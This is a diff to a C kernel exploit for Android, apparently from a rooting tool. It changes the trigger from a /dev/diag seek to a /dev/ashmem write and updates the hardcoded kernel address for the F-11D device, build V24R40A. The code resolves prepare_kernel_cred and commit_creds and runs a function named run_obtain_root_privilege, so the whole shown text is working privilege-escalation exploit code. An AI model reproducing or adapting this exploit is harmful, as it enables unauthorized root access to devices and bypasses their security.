@@ -16,17 +16,17 @@
 typedef struct _supported_device {
   const char *device;
   const char *build_id;
-  unsigned long int diagchar_llseek_address;
+  unsigned long int ashmem_write_address;
 } supported_device;
 
 static supported_device supported_devices[] = {
-  { "F-11D",            "V24R40A"   , 0xc06a203c },
+  { "F-11D",            "V24R40A"   , 0xc08ff1f4 },
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
 
 static unsigned long int
-get_diagchar_llseek_address(void)
+get_ashmem_write_address(void)
 {
   int i;
   char device[PROP_VALUE_MAX];
@@ -38,7 +38,7 @@ get_diagchar_llseek_address(void)
   for (i = 0; i < n_supported_devices; i++) {
     if (!strcmp(device, supported_devices[i].device) &&
         !strcmp(build_id, supported_devices[i].build_id)) {
-      return supported_devices[i].diagchar_llseek_address;
+      return supported_devices[i].ashmem_write_address;
     }
   }
 
@@ -89,10 +89,8 @@ run_obtain_root_privilege(void)
 {
   int fd;
 
-  fd = open("/dev/diag", O_RDONLY);
-  if (lseek64(fd, 1, SEEK_CUR) < 0) {
-    printf("Failed to seek due to %s.", strerror(errno));
-  }
+  fd = open("/dev/ashmem", O_WRONLY);
+  write(fd, " ", 1);
   close(fd);
 
   return true;
@@ -109,7 +107,7 @@ main(int argc, char **argv)
   prepare_kernel_cred = get_symbol_address("prepare_kernel_cred");
   commit_creds = get_symbol_address("commit_creds");
 
-  address = get_diagchar_llseek_address();
+  address = get_ashmem_write_address();
   if (!address) {
     exit(EXIT_FAILURE);
   }
